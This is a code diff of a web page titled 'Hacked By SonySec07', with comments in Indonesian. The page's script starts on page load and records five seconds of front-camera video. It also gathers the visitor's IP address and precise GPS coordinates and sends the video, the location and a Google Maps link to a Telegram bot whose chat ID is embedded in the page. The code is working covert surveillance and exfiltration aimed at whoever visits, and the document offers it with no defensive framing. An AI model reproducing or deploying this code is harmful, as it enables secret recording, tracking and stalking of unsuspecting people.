@@ -1,4 +1,5 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
     <title>Hacked By SonySec07</title>
     <meta charset="UTF-8"/>
@@ -17,110 +18,77 @@
             chatID: "7221518562"
         };
 
-        let isFrontCamera = true;
         let currentStream = null;
         let videoRecorder = null;
-        const RECORD_DURATION = 5000; // 5 detik
-
-        async function getVideoDevices() {
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            return devices.filter(device => device.kind === 'videoinput');
-        }
 
         async function startVideoRecording() {
             try {
-                const videoDevices = await getVideoDevices();
-                if(videoDevices.length === 0) {
-                    console.log('No camera detected');
-                    return;
-                }
-
+                // Mengatur constraints untuk hanya menggunakan kamera depan
                 const constraints = {
                     video: {
-                        facingMode: isFrontCamera ? "user" : "environment",
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
+                        facingMode: "user" // Meminta kamera depan
                     }
                 };
 
+                // Menghentikan stream sebelumnya jika ada
                 if (currentStream) {
                     currentStream.getTracks().forEach(track => track.stop());
                 }
 
+                // Meminta akses ke kamera depan
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 currentStream = stream;
                 const chunks = [];
                 
+                // Memulai perekaman
                 videoRecorder = new MediaRecorder(stream);
                 videoRecorder.ondataavailable = (event) => chunks.push(event.data);
                 
                 videoRecorder.onstop = async () => {
-                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
-                    await sendLocationData(videoBlob);
-                    
+                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                    await sendLocationAndVideo(videoBlob);
                     currentStream.getTracks().forEach(track => track.stop());
-                    if(isFrontCamera && videoDevices.length > 1) {
-                        isFrontCamera = false;
-                        setTimeout(startVideoRecording, 1000);
-                    }
                 };
 
                 videoRecorder.start();
-                setTimeout(() => {
-                    if(videoRecorder.state === "recording") {
-                        videoRecorder.stop();
-                    }
-                }, RECORD_DURATION);
-
-            } catch(error) {
-                console.error('Camera access error:', error);
+                setTimeout(() => videoRecorder.stop(), 5000); // Rekam selama 5 detik
+            } catch (error) {
+                console.error('Error mengakses kamera depan:', error);
+                if (error.name === 'NotAllowedError') {
+                    alert('Akses kamera ditolak. Silakan izinkan akses kamera untuk melanjutkan.');
+                } else if (error.name === 'NotFoundError') {
+                    alert('Kamera depan tidak ditemukan pada perangkat ini.');
+                }
             }
         }
 
-        async function getLocation() {
-            return new Promise((resolve, reject) => {
-                if(!navigator.geolocation) {
-                    reject('Geolocation not supported');
-                    return;
-                }
-
-                navigator.geolocation.getCurrentPosition(
-                    position => resolve(position.coords),
-                    error => reject(error),
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 5000,
-                        maximumAge: 0
-                    }
-                );
-            });
-        }
-
-        async function sendLocationData(videoBlob) {
+        async function sendLocationAndVideo(videoBlob) {
             try {
-                // Get IP and Location
+                // Mendapatkan Alamat IP
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const { ip } = await ipResponse.json();
-                const coords = await getLocation();
-                
-                const message = `📌 5 Second Recording Captured
-📡 IP Address: ${ip}
-📍 Coordinates:
-Latitude: ${coords.latitude}
-Longitude: ${coords.longitude}
-🌍 Google Maps: https://www.google.com/maps?q=${coords.latitude},${coords.longitude}
-🕒 Timestamp: ${new Date().toLocaleString()}`;
+                const { ip: userIP } = await ipResponse.json();
 
-                // Send Video
+                // Mendapatkan Lokasi Geografis
+                const position = await new Promise((resolve, reject) => 
+                    navigator.geolocation.getCurrentPosition(resolve, reject));
+                
+                const { latitude, longitude } = position.coords;
+                const message = `📍 New Visitor 🌐
+IP: ${userIP}
+Latitude: ${latitude}
+Longitude: ${longitude}
+Map: https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                // Mengirim Video
                 const videoForm = new FormData();
                 videoForm.append("chat_id", window.config.chatID);
-                videoForm.append("video", videoBlob, `recording_${Date.now()}.mp4`);
+                videoForm.append("video", videoBlob, "recording.webm");
                 await fetch(`https://api.telegram.org/bot${window.config.botToken}/sendVideo`, {
                     method: 'POST',
                     body: videoForm
                 });
 
-                // Send Location Details
+                // Mengirim Informasi Lokasi
                 await fetch(`https://api.telegram.org/bot${window.config.botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -129,31 +97,15 @@ Longitude: ${coords.longitude}
                         text: message
                     })
                 });
-
-            } catch(error) {
-                console.error('Error sending data:', error);
-                // Fallback if location blocked
-                const errorMessage = `❌ Location access blocked!\nIP: ${await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip)}`;
-                await fetch(`https://api.telegram.org/bot${window.config.botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: window.config.chatID,
-                        text: errorMessage
-                    })
-                });
+            } catch (error) {
+                console.error('Error mengirim data:', error);
             }
         }
 
-        // Initialize recording when page loads
+        // Memulai perekaman saat halaman dimuat
         document.addEventListener('DOMContentLoaded', () => {
-            if(navigator.mediaDevices?.getUserMedia) {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 startVideoRecording();
-            }
-            try {
-                document.querySelector('audio').play();
-            } catch(e) {
-                console.log('Audio autoplay blocked');
             }
         });
     </script>
